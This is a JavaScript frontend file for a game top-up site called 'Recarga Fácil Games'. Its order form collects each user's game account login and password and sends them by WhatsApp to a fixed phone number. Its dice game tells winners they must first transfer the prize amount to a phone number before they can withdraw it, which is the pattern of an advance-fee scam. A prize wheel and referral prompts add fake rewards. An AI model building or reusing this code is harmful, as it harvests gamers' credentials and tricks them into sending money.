// ========== JS Frontend Recarga Fácil Games ==========

// Envio do formulário para WhatsApp
const pedidoForm = document.getElementById('pedidoForm');
if (pedidoForm) {
  pedidoForm.addEventListener('submit', function(e) {
    e.preventDefault();
    if (!validarCamposObrigatorios(pedidoForm, ['nome','whatsapp','jogo','idjogo','senha','conta-login','valor'])) {
      alert('Por favor, preencha todos os campos obrigatórios!');
      return;
    }
    const nome = document.getElementById('nome').value.trim();
    const whatsapp = document.getElementById('whatsapp').value.trim();
    const jogo = document.getElementById('jogo').value;
    const idjogo = document.getElementById('idjogo').value.trim();
    const senha = document.getElementById('senha').value.trim();
    const contaLogin = document.getElementById('conta-login').value.trim();
    const valor = document.getElementById('valor').value;
    const msg =
      `*Novo Pedido de Recarga*%0A` +
      `Nome: ${nome}%0A` +
      `WhatsApp: ${whatsapp}%0A` +
      `Jogo: ${jogo}%0A` +
      `ID/Nome no Jogo: ${idjogo}%0A` +
      `Conta de Login: ${contaLogin}%0A` +
      `Senha: ${senha}%0A` +
      `Valor: ${valor} escudos`;
    const link = `https://wa.me/2389149532?text=${encodeURIComponent(msg)}`;
    window.open(link, '_blank');
    // Bloquear campos e botão após envio
    Array.from(pedidoForm.elements).forEach(el => {
      el.disabled = true;
    });
    setTimeout(() => {
      alert('✅ Pedido enviado! Aguarde nosso contato no WhatsApp.');
    }, 500);
  });
}

// Notificações dinâmicas
const notificacoes = [
  '🔔 Promoção! Recarregue 500 escudos e ganhe bônus de 50!',
  '🔥 Novo jogo disponível: Brawl Stars!',
  '💬 Atendimento 24h via WhatsApp!',
  '🎁 Indique amigos e ganhe descontos exclusivos!'
];
function exibirNotificacoes() {
  const area = document.getElementById('notificacoes');
  if (!area) return;
  area.innerHTML = '<h3>Notificações Recentes</h3>' + notificacoes.map(n => `<div class="notificacao">${n}</div>`).join('');
}
exibirNotificacoes();

// Jogo de Dados e Recarga de Saldo
const saldoForm = document.getElementById('saldoForm');
const jogoDadosArea = document.getElementById('jogo-dados-area');
const jogarDadosBtn = document.getElementById('jogar-dados');
const resultadoDados = document.getElementById('resultado-dados');

if (saldoForm) {
  saldoForm.addEventListener('submit', function(e) {
    e.preventDefault();
    // Simula registro do saldo e libera o jogo de dados
    saldoForm.style.display = 'none';
    jogoDadosArea.style.display = 'block';
    resultadoDados.innerHTML = '';
  });
}
if (jogarDadosBtn) {
  jogarDadosBtn.addEventListener('click', function() {
    // Simula um lançamento de dados (1 a 6)
    const dado = Math.floor(Math.random() * 6) + 1;
    let premio = '';
    switch (dado) {
      case 6:
        premio = '🎉 Parabéns! Você ganhou 100 escudos de bônus!';
        break;
      case 5:
        premio = '👏 Você ganhou 50 escudos de bônus!';
        break;
      case 4:
        premio = '😃 Você ganhou 20 escudos de bônus!';
        break;
      default:
        premio = 'Tente novamente! Quem sabe na próxima você ganha um prêmio.';
    }
    resultadoDados.innerHTML = `Você tirou <strong>${dado}</strong> no dado.<br>${premio}`;
    resultadoDados.classList.remove('ganhou','perdeu');
    if ([4,5,6].includes(dado)) {
      resultadoDados.classList.add('ganhou');
      resultadoDados.innerHTML += `<br><span style='color:#ffd700;font-weight:bold;'>Para sacar seu prêmio, transfira o valor ganho para o chip <strong>+238 9149532</strong> e envie o comprovante pelo WhatsApp!</span>`;
    } else {
      resultadoDados.classList.add('perdeu');
    }
  });
}

// Máscara para campo de WhatsApp (formulários)
function aplicarMascaraTelefone(input) {
  input.addEventListener('input', function() {
    let v = input.value.replace(/\D/g, '');
    if (v.length > 3) v = v.replace(/(\d{3})(\d)/, '$1 $2');
    if (v.length > 7) v = v.replace(/(\d{3}) (\d{3})(\d)/, '$1 $2 $3');
    input.value = v;
  });
}
const telInputs = [
  document.getElementById('whatsapp'),
  document.getElementById('whatsapp-dados')
].filter(Boolean);
telInputs.forEach(aplicarMascaraTelefone);

// Validação extra de campos obrigatórios
function validarCamposObrigatorios(form, campos) {
  let valido = true;
  campos.forEach(id => {
    const el = document.getElementById(id);
    if (el && !el.value.trim()) {
      el.style.borderColor = 'red';
      valido = false;
    } else if (el) {
      el.style.borderColor = '';
    }
  });
  return valido;
}
if (pedidoForm) {
  pedidoForm.addEventListener('submit', function(e) {
    if (!validarCamposObrigatorios(pedidoForm, ['nome','whatsapp','jogo','idjogo','senha','conta-login','valor'])) {
      e.preventDefault();
      alert('Por favor, preencha todos os campos obrigatórios!');
      return;
    }
  });
}
if (saldoForm) {
  saldoForm.addEventListener('submit', function(e) {
    if (!validarCamposObrigatorios(saldoForm, ['nome-dados','whatsapp-dados','valor-saldo'])) {
      e.preventDefault();
      alert('Por favor, preencha todos os campos obrigatórios!');
      return;
    }
  });
}

// Rotação automática de notificações
let notifIndex = 0;
function rotacionarNotificacoes() {
  const area = document.getElementById('notificacoes');
  if (!area) return;
  notifIndex = (notifIndex + 1) % notificacoes.length;
  area.innerHTML = '<h3>Notificações Recentes</h3>' + `<div class="notificacao">${notificacoes[notifIndex]}</div>`;
}
setInterval(rotacionarNotificacoes, 5000);

// Estilo para notificações e jogo de dados
const style = document.createElement('style');
style.innerHTML = `
  .notificacao { background: #e3f2fd; color: #1976d2; border-radius: 8px; padding: 10px; margin-bottom: 8px; font-weight: 500; }
  #jogo-dados-area { text-align: center; }
  .ganhou { color: green; font-weight: bold; }
  .perdeu { color: red; font-weight: bold; }
`;
document.head.appendChild(style);

// Indique e Ganhe - Compartilhamento WhatsApp
const btnIndicar = document.getElementById('btn-indicar');
const msgIndicacao = document.getElementById('msg-indicacao');
if (btnIndicar) {
  btnIndicar.onclick = function() {
    const texto = encodeURIComponent('Olha esse site de recarga de jogos! Ganhe bônus e prêmios: https://seusite.com');
    window.open(`https://wa.me/?text=${texto}`, '_blank');
    if (msgIndicacao) {
      msgIndicacao.textContent = '✅ Obrigado por compartilhar! Quando seu amigo recarregar, você ganha 10% de bônus!';
    }
  };
}

// Roleta da Sorte (apenas números)
const roletaCanvas = document.getElementById('roletaCanvas');
const ctx = roletaCanvas ? roletaCanvas.getContext('2d') : null;
const girarBtn = document.getElementById('girarRoleta');
const resultadoRoleta = document.getElementById('resultado-roleta');

const setores = [
  { texto: '1', cor: '#ffd700' },
  { texto: '2', cor: '#23272a' },
  { texto: '3', cor: '#ffd700' },
  { texto: '4', cor: '#23272a' },
  { texto: '5', cor: '#ffd700' },
  { texto: '6', cor: '#23272a' }
];
const totalSetores = setores.length;
let anguloAtual = 0;
let girando = false;

function desenharRoleta(angulo = 0) {
  if (!ctx) return;
  ctx.clearRect(0, 0, roletaCanvas.width, roletaCanvas.height);
  const raio = roletaCanvas.width / 2;
  for (let i = 0; i < totalSetores; i++) {
    const inicio = angulo + (i * 2 * Math.PI) / totalSetores;
    const fim = angulo + ((i + 1) * 2 * Math.PI) / totalSetores;
    ctx.beginPath();
    ctx.moveTo(raio, raio);
    ctx.arc(raio, raio, raio, inicio, fim);
    ctx.closePath();
    ctx.fillStyle = setores[i].cor;
    ctx.fill();
    // Centralizar o número no centro da fatia
    const anguloTexto = inicio + (fim - inicio) / 2;
    const x = raio + Math.cos(anguloTexto) * (raio * 0.65);
    const y = raio + Math.sin(anguloTexto) * (raio * 0.65) + 10;
    ctx.save();
    ctx.font = 'bold 32px Arial';
    ctx.textAlign = 'center';
    ctx.textBaseline = 'middle';
    ctx.fillStyle = setores[i].cor === '#ffd700' ? '#23272a' : '#ffd700';
    ctx.shadowColor = '#000';
    ctx.shadowBlur = 2;
    ctx.fillText(setores[i].texto, x, y);
    ctx.restore();
  }
  // Indicador
  ctx.beginPath();
  ctx.moveTo(raio, 10);
  ctx.lineTo(raio - 12, 30);
  ctx.lineTo(raio + 12, 30);
  ctx.closePath();
  ctx.fillStyle = '#e74c3c';
  ctx.fill();
}

function girarRoletaAnimado() {
  if (girando) return;
  girando = true;
  resultadoRoleta.textContent = '';
  let velocidade = Math.random() * 0.15 + 0.25;
  let giros = Math.floor(Math.random() * 3) + 5;
  let totalFrames = giros * totalSetores * 10;
  let frame = 0;
  function animar() {
    frame++;
    anguloAtual += velocidade;
    velocidade *= 0.985;
    desenharRoleta(anguloAtual);
    if (frame < totalFrames || velocidade > 0.01) {
      requestAnimationFrame(animar);
    } else {
      finalizarRoleta();
    }
  }
  animar();
}

function finalizarRoleta() {
  anguloAtual = anguloAtual % (2 * Math.PI);
  const setor = totalSetores - Math.floor((anguloAtual / (2 * Math.PI)) * totalSetores) % totalSetores;
  const resultado = setores[setor % totalSetores];
  let mensagem = '';
  let premio = '';
  switch (resultado.texto) {
    case '1': premio = '100$ Bônus na próxima recarga!'; break;
    case '2': premio = 'Tente novamente!'; break;
    case '3': premio = '50$ Bônus na próxima recarga!'; break;
    case '4': premio = 'Tente novamente!'; break;
    case '5': premio = '25$ Bônus na próxima recarga!'; break;
    case '6': premio = 'Tente novamente!'; break;
    default: premio = '';
  }
  if (premio !== 'Tente novamente!') {
    mensagem = `<div style='background:#23272a;color:#ffd700;padding:16px 20px;border-radius:10px;max-width:350px;margin:18px auto 0 auto;font-size:1.1rem;'>🎉 Parabéns!<br>Você ganhou: <strong>${premio}</strong></div>`;
  } else {
    mensagem = `<div style='background:#23272a;color:#fff;padding:16px 20px;border-radius:10px;max-width:350px;margin:18px auto 0 auto;font-size:1.1rem;'>Não foi dessa vez.<br><strong>Tente novamente!</strong></div>`;
  }
  resultadoRoleta.innerHTML = mensagem;
  girando = false;
}
if (roletaCanvas) desenharRoleta();
if (girarBtn) {
  girarBtn.onclick = girarRoletaAnimado;
}
